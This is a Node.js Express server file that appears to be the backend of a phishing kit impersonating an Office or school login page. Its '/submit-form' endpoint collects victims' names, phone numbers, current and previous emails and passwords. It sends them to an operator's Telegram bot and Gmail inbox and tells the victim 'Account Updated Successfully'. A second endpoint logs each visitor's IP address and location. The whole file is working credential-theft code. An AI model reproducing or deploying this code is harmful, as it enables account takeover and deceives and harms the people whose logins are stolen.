const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const nodemailer = require('nodemailer');

// Initialize the app
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Email Configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Helper to send Telegram message
async function sendTelegramMessage(message) {
  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    }),
  });
}

// New endpoint to alert on page load
app.post('/visitor-alert', async (req, res) => {
  try {
    const ipInfoRes = await fetch('https://ipinfo.io/json?token=b0c08e58958f26');
    const location = await ipInfoRes.json();
    const dateTime = new Date().toLocaleString();

    const alertMessage = `
👀 <b>New Office Visitor Alert</b>

🌍 <b>Location:</b> ${location.city || 'Unknown'}, ${location.region || 'Unknown'}, ${location.country || 'Unknown'}
🌐 <b>IP:</b> ${location.ip || 'Unknown'}
🕒 <b>Time:</b> ${dateTime}
    `;

    // Send Telegram
    await sendTelegramMessage(alertMessage);

    // Send Email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_RECIPIENT,
      subject: 'New Office Visitor Alert',
      html: alertMessage.replace(/\n/g, '<br>'),
    };

    await transporter.sendMail(mailOptions);

    res.status(200).json({ message: 'Visitor alert sent successfully' });
  } catch (error) {
    console.error('Error sending visitor alert:', error);
    res.status(500).json({ error: 'Failed to send visitor alert' });
  }
});

// Submit-form endpoint
app.post('/submit-form', async (req, res) => {
  try {
    const {
      fullName,
      phoneNumber,
      currentEmail,
      previousEmail,
      currentPassword,
      previousPassword,
      locationData,
      dateTime,
    } = req.body;

    const message = `
📥 <b>New Office School Logins:</b>

👤 <b>Full Name:</b> ${fullName}
📞 <b>Phone:</b> ${phoneNumber}
📧 <b>Current Email:</b> ${currentEmail}
🔐 <b>Current Password:</b> ${currentPassword}
📧 <b>Previous Email:</b> ${previousEmail}
🔐 <b>Previous Password:</b> ${previousPassword}

🌍 <b>Location:</b> ${locationData.city}, ${locationData.region}, ${locationData.country}
🌐 <b>IP:</b> ${locationData.ip}
🕒 <b>Time:</b> ${dateTime}
    `;

    await sendTelegramMessage(message);

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_RECIPIENT,
      subject: 'New Office School Logins',
      html: message.replace(/\n/g, '<br>'),
    });

    res.status(200).json({ message: 'Account Updated Successfully' });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).json({ error: 'Reconfirm Your Details' });
  }
});

// Exporting the app for Vercel
module.exports = app;
